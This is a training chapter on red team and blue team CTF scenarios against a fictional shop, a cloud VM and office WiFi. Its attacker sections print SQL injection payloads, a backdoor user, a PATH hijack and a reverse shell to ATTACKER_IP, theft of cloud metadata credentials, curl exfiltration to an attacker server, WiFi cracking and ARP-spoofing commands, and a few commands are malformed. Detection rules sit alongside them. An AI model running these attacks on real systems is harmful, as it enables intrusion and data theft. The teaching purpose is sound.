# Part 4: Capture The Flag (CTF) Scenarios & Red Team/Blue Team Exercises

## Overview

This part combines offensive and defensive skills from Chapters 1-6 into realistic Capture The Flag (CTF) scenarios. You'll participate in both Red Team (attacker) and Blue Team (defender) roles to develop comprehensive security perspectives.

**Learning Objectives:**
- Execute multi-stage attack chains against vulnerable applications
- Detect, respond to, and mitigate active attacks
- Document findings professionally for security reports
- Understand attacker-defender dynamics in real-time
- Practice incident response procedures

---

## Section 1: CTF Challenge Structure

### Challenge Types

**Web Application Vulnerabilities:**
- SQL Injection leading to database extraction
- Cross-Site Scripting (XSS) for session hijacking
- Broken Authentication for account takeover
- Insecure Direct Object References (IDOR)

**Network/Server Challenges:**
- Misconfigurations exposing sensitive information
- Default credentials on exposed services
- Weak SSH/TLS configurations
- Information disclosure through error messages

**Privilege Escalation Chains:**
- Initial foothold on low-privilege account
- Privilege escalation to root/admin
- Lateral movement between systems
- Persistence establishment

### Flag Format

All flags follow this standard format:
```
FLAG{scenario_key_evidence_base64}
```

Example: `FLAG{sql_injection_admin_password_YWRtaW46c2VjcmV0}` (decoded: `admin:secret`)

---

## Section 2: Scenario 1 - E-Commerce Platform Breach

### Scenario Description

**Target:** VulnerableShop (fictional e-commerce platform)  
**Objective:** Extract customer database and admin credentials  
**Difficulty:** Intermediate  
**Time Estimate:** 60-90 minutes

### Red Team Challenge (Attacker Perspective)

#### Stage 1: Reconnaissance
```bash
# Step 1: Scan target website from Linux/WSL
nmap -sV -sC -A target-ecommerce.local
# Windows PowerShell equivalent using ping first
Test-NetConnection -ComputerName target-ecommerce.local -Port 443

# Step 2: Enumerate web application
curl -I http://target-ecommerce.local/
curl http://target-ecommerce.local/robots.txt
curl http://target-ecommerce.local/sitemap.xml

# Step 3: Check for default credentials
# Common locations: /admin, /wp-admin, /admin.php, /administrator/

# Step 4: Identify web framework
# Look for: X-Powered-By headers, File extensions (.php, .asp, .jsp)
curl -v http://target-ecommerce.local/ 2>&1 | grep -i powered

# Windows PowerShell:
(Invoke-WebRequest -Uri "http://target-ecommerce.local/").Headers | Select-Object "X-Powered-By"
```

#### Stage 2: SQL Injection Discovery
```bash
# Step 1: Identify injectable parameters
# Common locations: /search, /products, /users, /login

# Step 2: Test basic SQL injection
# Test payload in search field:
' OR '1'='1

# Vulnerable request example:
curl "http://target-ecommerce.local/search?q='+OR+1=1--"

# Step 3: UNION-based SQL injection
# Determine number of columns:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

# Step 4: Extract database structure
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--

# Step 5: Extract admin credentials
' UNION SELECT username,password,email,id FROM admin_users--

# Step 6: Save credentials
# Expected output: admin:SuperSecret123!
```

#### Stage 3: Authentication Bypass
```bash
# Step 1: Test for weak password hashing
# Attempt common passwords:
admin:admin
admin:password
admin:123456

# Step 2: Use obtained credentials to login
curl -X POST http://target-ecommerce.local/login \
  -d "username=admin&password=SuperSecret123!" \
  -c cookies.txt

# Windows PowerShell:
$params = @{
    username = "admin"
    password = "SuperSecret123!"
}
$response = Invoke-WebRequest -Uri "http://target-ecommerce.local/login" `
  -Method POST -Body $params -SessionVariable session

# Step 3: Access admin dashboard (should have elevated privileges)
curl -b cookies.txt http://target-ecommerce.local/admin/dashboard

# Step 4: Export customer database
curl -b cookies.txt http://target-ecommerce.local/admin/export-users > users.csv

# FLAG: FLAG{sql_injection_db_extraction_YWRtaW46U3VwZXJTZWNyZXQxMjMh}
```

#### Stage 4: Privilege Escalation (if applicable)
```bash
# If web shell access gained:
# Step 1: Check current user and permissions
whoami
id
sudo -l

# Step 2: Find locally exploitable vulnerabilities
# Check kernel version:
uname -a

# Step 3: Upload and execute privilege escalation exploit
# Example: CVE-2024-XXXXX kernel exploit

# Step 4: Establish persistent access
# Create backdoor user:
useradd -m -s /bin/bash attacker
echo "attacker:AttackerPass123" | chpasswd

# FLAG: FLAG{privilege_escalation_root_access_Z3JlcHc6R3JlcHdsYXNzUGFzcw==}
```

### Blue Team Challenge (Defender Perspective)

#### Detection: SQL Injection Attempts
```bash
# Step 1: Review web server access logs
tail -n 1000 /var/log/apache2/access.log | grep "UNION SELECT"
tail -n 1000 /var/log/nginx/access.log | grep "OR.*1=1"

# Windows (IIS logs):
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*.log" | Select-String "UNION"

# Step 2: Check for SQL patterns
grep -i "union\|select\|or.*1.*1" /var/log/apache2/access.log

# Step 3: Analyze request frequency
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Step 4: Block malicious IPs with Fail2Ban
# Create custom filter in /etc/fail2ban/filter.d/sql-injection.conf:
```

```ini
[Definition]
failregex = ^<HOST>.*UNION.*SELECT.*HTTP
            ^<HOST>.*OR.*1.*=.*1.*HTTP
            ^<HOST>.*SLEEP.*\(.*\).*HTTP
            ^<HOST>.*BENCHMARK.*\(.*\).*HTTP
ignoreregex =
```

```bash
# Step 5: Enable in jail.local
[sql-injection]
enabled = true
port = http,https
filter = sql-injection
logpath = /var/log/apache2/access.log
maxretry = 3
findtime = 600
bantime = 3600

# Restart Fail2Ban:
sudo systemctl restart fail2ban

# Step 6: Monitor active connections
netstat -tulpn | grep ESTABLISHED
ss -tulpn | grep ESTABLISHED

# Windows:
netstat -ano | findstr "ESTABLISHED"
```

#### Response: Incident Containment
```bash
# Step 1: Identify compromised admin account
grep "admin" /var/log/apache2/access.log | grep "POST.*login"

# Step 2: Force password reset
sudo passwd admin
# New password: SecureNewPassword456!

# Step 3: Review admin actions since compromise (e.g., last 24 hours)
journalctl --since "24 hours ago" | grep -i admin

# Step 4: Disable/revoke admin session tokens
# In application database:
UPDATE sessions SET active=0 WHERE user_id=1;

# Step 5: Monitor for persistence mechanisms
find /home -name ".bashrc" -mtime -1  # Recently modified
find / -name "*.php" -type f -mtime -1 2>/dev/null | head -20

# Windows:
Get-Item -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force
```

#### Remediation: Fix Vulnerabilities
```bash
# Step 1: Update input validation in application
# Example: Parameterized queries (pseudo-code)
# VULNERABLE:
query = "SELECT * FROM products WHERE id = " + user_input
# FIXED:
query = "SELECT * FROM products WHERE id = ?"
execute(query, [user_input])

# Step 2: Apply security headers
# In /etc/nginx/nginx.conf or Apache .htaccess:
add_header X-Content-Type-Options "nosniff";
add_header X-Frame-Options "SAMEORIGIN";
add_header X-XSS-Protection "1; mode=block";
add_header Content-Security-Policy "default-src 'self'";

# Step 3: Enable WAF (Web Application Firewall)
# ModSecurity enabled in Apache:
sudo a2enmod security2
sudo systemctl restart apache2

# Step 4: Update database user permissions
# Create limited application user (NOT admin):
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'AppPassword123!';
GRANT SELECT, INSERT, UPDATE ON ecommerce.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;

# Step 5: Restore database from clean backup
mysqldump ecommerce > backup_post_incident.sql
mysql ecommerce < backup_clean_2024_01_01.sql

# Step 6: Enable database audit logging
# MySQL audit plugin configuration
```

---

## Section 3: Scenario 2 - Cloud Instance Misconfiguration

### Scenario Description

**Target:** AWS/Azure instance with misconfigured security groups  
**Objective:** Access sensitive files, establish persistence, traverse to other VMs  
**Difficulty:** Intermediate-Advanced  
**Time Estimate:** 90-120 minutes

### Red Team: Lateral Movement

#### Stage 1: Initial Reconnaissance
```bash
# Step 1: Scan for exposed ports
nmap -p- --open target-cloud-vm.local

# Step 2: Identify running services
nmap -sV target-cloud-vm.local

# Step 3: Check for default credentials on services
# SSH: ssh -u root target-cloud-vm.local (try empty password)
# Database: mysql -h target-cloud-vm.local -u root

# Step 4: Enumerate cloud metadata (if AWS/Azure)
curl http://169.254.169.254/latest/meta-data/
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Windows (WSL): Same curl commands work

# Step 5: Extract credentials from metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token
```

#### Stage 2: Privilege Escalation
```bash
# Step 1: Check sudo privileges
sudo -l
# Output example: User www-data may run (root) NOPASSWD: /bin/systemctl

# Step 2: Exploit misconfigurations
# If can run systemctl as root without password:
sudo systemctl status ssh
sudo systemctl start ssh

# Step 3: Check SUID binaries
find / -perm -4000 2>/dev/null
# Look for uncommon/vulnerable SUID binaries

# Step 4: Check writable system paths
find / -writable -type f 2>/dev/null | grep -E "^/etc|^/root|^/home" | head -20

# Step 5: Exploit PATH manipulation
# Create malicious binary:
echo '#!/bin/bash' > /tmp/ps
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
# Wait for program that calls 'ps' to run with elevated privileges
```

#### Stage 3: Lateral Movement
```bash
# Step 1: Discover other VMs/instances
# Check network configuration:
ip route
route -n

# Windows/WSL PowerShell:
Get-NetRoute

# Step 2: Scan internal network
nmap 10.0.0.0/24 --open -p 22,3306,5432

# Step 3: Attempt SSH to other hosts with gathered credentials
ssh -i extracted_key.pem ubuntu@10.0.0.50
ssh -i extracted_key.pem root@10.0.0.51

# Step 4: Plant reverse shell
# On attacker machine, set up listener:
nc -lvnp 4444
# On compromised VM:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

#### Stage 4: Data Exfiltration
```bash
# Step 1: Identify valuable data
find / -name "*.sql" -o -name "*.bak" -o -name "*secret*" 2>/dev/null

# Step 2: Compress data
tar -czf sensitive_data.tar.gz /var/www/html /home/*/documents

# Step 3: Exfiltrate via SCP/SFTP
scp -r sensitive_data/ attacker@attacker-server:/storage/
# or
curl -F "file=@sensitive_data.tar.gz" http://attacker-server:8000/upload

# FLAG: FLAG{cloud_misconfiguration_lateral_movement_QmFydGljYWxNb3ZlbWVudA==}
```

### Blue Team: Detection & Response

#### Detection: Anomalous Network Activity
```bash
# Step 1: Monitor network connections
netstat -tulpn | grep ESTABLISHED
ss -tulpn | grep ESTABLISHED

# Check for suspicious outbound connections:
netstat -tulpn | grep tcp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c

# Windows:
netstat -ano | findstr "ESTABLISHED" | findstr /C:"0.0.0.0:0" 

# Step 2: Analyze traffic with tcpdump
tcpdump -i eth0 'ip.dst != 10.0.0.0/8' -w external_traffic.pcap
tcpdump -r external_traffic.pcap | head -50

# Step 3: Check cloud security logs
# AWS CloudTrail
aws cloudtrail lookup-events --region us-east-1

# Azure Activity Log
az monitor activity-log list --resource-group <RG_NAME>

# Step 4: Review process execution logs
auditctl -w /var/www/html -p wa -k web_changes
tail -f /var/log/audit/audit.log | grep web_changes
```

#### Response: Incident Investigation
```bash
# Step 1: Capture system state (immediate forensics)
ps auxww > running_processes.txt
netstat -tulpn > active_connections.txt
lsof -i > open_files.txt
last -n 20 > login_history.txt
sudo journalctl -n 1000 > system_journal.txt

# Step 2: Check for unauthorized access
grep "Failed password" /var/log/auth.log | tail -50
grep "sudo" /var/log/auth.log | tail -50

# Step 3: Identify compromised accounts
lastlog | grep "**Never logged in**"  # Suspended accounts
awk -F: '$3 >= 1000 {print $1}' /etc/passwd  # Non-system users

# Step 4: Find persistence mechanisms
find / -type f -mtime -1 -executable 2>/dev/null  # Recent executable changes
find /home -name ".ssh" -type d
cat /home/*/. ssh/authorized_keys 2>/dev/null

# Windows:
Get-Process | Where-Object {$_.Handles -gt 1000}
Get-NetTCPConnection -State Established | Select-Object Local Address, Local Port, Remote Address, Remote Port | Sort-Object RemoteAddress -Unique
```

#### Remediation: System Hardening
```bash
# Step 1: Remove unauthorized keys
# Edit thoroughly:
sudo nano /root/.ssh/authorized_keys
# Verify only known keys remain

# Step 2: Change compromised credentials
sudo passwd root  # Change root password
sudo passwd ubuntu  # Change user passwords
# Update SSH key pair

# Step 3: Update security group rules (cloud)
# AWS: Remove overly permissive rules
# Remove: inbound rules allowing 0.0.0.0/0 on ports 22, 3306, 5432

aws ec2 revoke-security-group-ingress \
  --group-id sg-xxxxx \
  --protocol tcp --port 22 --cidr 0.0.0.0/0

# Step 4: Patch vulnerabilities
sudo apt update && sudo apt full-upgrade -y

# Step 5: Re-hardened configuration
# Disable unused services:
sudo systemctl disable <service>
sudo systemctl stop <service>

# Step 6: Rotate cloud credentials
aws iam create-access-key --user-name <username>
aws iam delete-access-key --user-name <username> --access-key-id <OLD_KEY>

# Step 7: Enable enhanced monitoring
aws ec2 monitor-instances --instance-ids i-xxxxx
```

---

## Section 4: Scenario 3 - Wireless Network Attack

### Scenario Description

**Target:** Office WiFi network  
**Objective:** Capture handshake, crack password, MITM attack  
**Difficulty:** Advanced (requires wireless adapter & aircrack-ng)  
**Time Estimate:** 120+ minutes

### Red Team: WiFi Exploitation

#### Stage 1: Wireless Reconnaissance
```bash
# Requires Kali Linux, wireless adapter in monitor mode, or WSL2 with USB passthrough

# Step 1: Scan WiFi networks
sudo iwlist wlan0 scan | grep -E "ESSID|Signal|Frequency"

# Airodump alternative:
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Step 2: Identify target network
# Look for: Network name, Channel, RSSI (signal strength), Encryption

# Step 3: Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon -w capture

# Step 4: Force client disconnection (deauthentication attack)
# In another terminal:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# This forces client to reconnect, capturing handshake
```

#### Stage 2: Wordlist & Cracking
```bash
# Step 1: Prepare wordlist
# Download rockyou.txt:
cd /usr/share/wordlists
sudo apt install wordlists
# or
wget https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlist.txt

# Step 2: Crack WPA2 handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Output example:
# KEY FOUND! [ CompanyWiFi2024! ]

# Step 3: Verify credentials
sudo airmon-ng stop wlan0mon
sudo iwconfig wlan0 essid "TargetNetwork" key s:CompanyWiFi2024!
# or use:
sudo nmcli dev wifi connect TargetNetwork password CompanyWiFi2024!

# Windows/WSL: Use GUI network manager or:
# netsh wlan add profile name=TargetNetwork interface=WiFi
# netsh wlan set profileparameter name=TargetNetwork interface=WiFi keymaterial=CompanyWiFi2024!
```

#### Stage 3: Man-in-the-Middle Attack
```bash
# Step 1: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 2: Set up ARP spoofing
sudo arpspoof -i wlan0 -t <GATEWAY_IP> <TARGET_IP>

# Step 3: Set up traffic interception
sudo mitmproxy -i wlan0 --mode transparent

# Step 4: Analyze captured traffic
# In mitmproxy interface:
# - View unencrypted HTTP requests
# - Capture credentials (Basic Auth)
# - Extract sensitive information

# Step 5: SSL stripping (if targets use HTTP)
sudo arpspoof -i wlan0 -t <GATEWAY_IP> <TARGET_IP>
sudo ettercap -T -q -i wlan0 -M arp /<GATEWAY_IP>/ /<TARGET_IP>/

# FLAG: FLAG{wireless_network_mitm_attack_V2lGaVBhc3N3b3JkIGZvdW5k}
```

### Blue Team: Wireless Defense

#### Detection: Unauthorized Access
```bash
# Step 1: Monitor connected clients
arp-scan -l
# or
ip neigh show  # Show ARP table

# Step 2: Identify unknown MAC addresses
# Manufacturer lookup for suspicious MACs
oui lookup AA:BB:CC:DD:EE:FF

# Step 3: Check WiFi client logs
sudo journalctl | grep -i wifi
sudo journalctl | grep -i wireless

# Step 4: Monitor for deauthentication attacks
# Use WiFi analyzer tools:
sudo airodump-ng wlan0mon | grep -i "deauth"

# Step 5: Check for MITM/ARP spoofing
arp-scan -l | sort
# Compare with known MAC addresses; look for duplicates
```

#### Remediation: WiFi Security
```bash
# Step 1: Update WiFi password
# Access router admin (192.168.1.1 typically):
# Change: Security > Wireless Security > Password to: ComplexWiFiPass2024!@#

# Step 2: Disable WPA2-PSK vulnerability (if possible)
# Update to WPA3-Enterprise if supported
# Or enable WPA3-Personal with strong pre-shared key (32+ characters)

# Step 3: Disable WPS
# Admin panel: Security > WPS > Disable

# Step 4: Enable & configure firewall
# Block MAC addresses of compromised clients temporarily:
# Admin panel: MAC Filtering > Add: [suspicious_MAC]

# Step 5: Broadcast less information
# Hide SSID (security by obscurity - limited value)
# Disable: Broadcast SSID: OFF

# Step 6: Update router firmware
# Check manufacturer website for latest security patches

# Step 7: Segment network traffic
# Separate guest network from corporate network
# Use VLANs if enterprise router available
```

---

## Section 5: Documentation & Assessment Rubric

### Red Team Deliverables

Each Red Team exercise should include:

1. **Discovery Report**
   - Reconnaissance findings
   - Identified vulnerabilities
   - Severity assessment
   - Proof-of-concept exploitation

2. **Attack Chain Documentation**
   - Step-by-step attack progression
   - Tools used and commands executed
   - Output at each stage
   - Time to exploitation

3. **Evidence Collection**
   - Screenshots of successful exploitation
   - Captured credentials/flags
   - Exfiltrated data samples
   - Log entries showing attacker activity

### Blue Team Deliverables

Each Blue Team exercise should include:

1. **Detection Report**
   - Alerts generated
   - Log analysis findings
   - Anomalies identified
   - Detection latency (time to discovery)

2. **Incident Response Timeline**
   - Initial alert time
   - Investigation steps taken
   - Containment actions
   - Total response time

3. **Remediation Plan**
   - Vulnerabilities fixed
   - Security controls implemented
   - Configuration changes made
   - Verification of fixes

### Grading Rubric

| Category | Points | Criteria |
|----------|--------|----------|
| **Discovery** | 15 | Thorough reconnaissance, all services identified |
| **Exploitation** | 25 | Successful compromise, multiple attack paths attempted |
| **Evidence** | 15 | Clear documentation, screenshots, captured flags |
| **Detection** | 20 | Early threat detection, proper alerting configured |
| **Response** | 15 | Quick containment, appropriate mitigations applied |
| **Documentation** | 10 | Clear writing, technical accuracy, professional formatting |
| **TOTAL** | 100 | |

---

## Section 6: Advanced Scenarios (Self-Study)

### Scenario 4: Supply Chain Attack
- Compromise of third-party software/packages
- Trojanized update delivery
- Vendor backdoor implantation

### Scenario 5: Multi-Stage Ransomware
- Initial compromise through phishing
- Lateral movement and credential theft
- File encryption and extortion

### Scenario 6: Data Exfiltration Campaign
- Long-term persistence establishment
- Data staging and compression
- Covert exfiltration channels

### Scenario 7: Insider Threat
- Privileged account abuse
- Data theft by authorized user
- Cover-up and log tampering

---

## Section 7: Tools Reference

### Red Team Tools
- **Nmap**: Network scanning and service enumeration
- **Burp Suite**: Web application testing
- **Wireshark**: Network traffic analysis
- **Metasploit**: Exploitation framework
- **SQLMap**: SQL injection automation
- **John the Ripper**: Password cracking
- **Aircrack-ng**: WiFi security testing

### Blue Team Tools
- **Fail2Ban**: Intrusion prevention
- **Snort**: Network IDS
- **ELK Stack**: Centralized logging
- **OSSEC**: Host-based IDS
- **Splunk/Graylog**: SIEM platforms
- **tcpdump**: Traffic capture
- **auditd**: System audit logging

---

## Section 8: Final Project Requirements

### Portfolio Deliverables

By end of Chapter 6, prepare:

1. **Red Team Attack Report** (15-20 pages)
   - Executive summary for non-technical stakeholders
   - Detailed attack chain for technical audience
   - Vulnerability analysis
   - Business impact assessment

2. **Blue Team Defense Report** (15-20 pages)
   - Detection methodology
   - Incident response procedures
   - Security controls implemented
   - Recommendations for future hardening

3. **Combined Executive Brief** (5-10 pages)
   - Attack objectives vs defenses
   - Lessons learned
   - Security maturity assessment
   - Risk rankings

4. **30-Minute Presentation**
   - Demonstrate attack execution (recorded or simulat)
   - Show detection/response procedures
   - Discuss trade-offs between security and usability
   - Recommend improvements

---

## Next Steps

1. **Choose your CTF scenarios** based on your interests (web, network, wireless)
2. **Set up test environment** using VirtualBox, AWS free tier, or HackTheBox
3. **Document thoroughly** as you progress through Red/Blue Team exercises
4. **Present findings** to peers for feedback
5. **Iterate and refine** your security practices

Good luck and remember: *With great power comes great responsibility!* Always obtain proper authorization before testing any system.
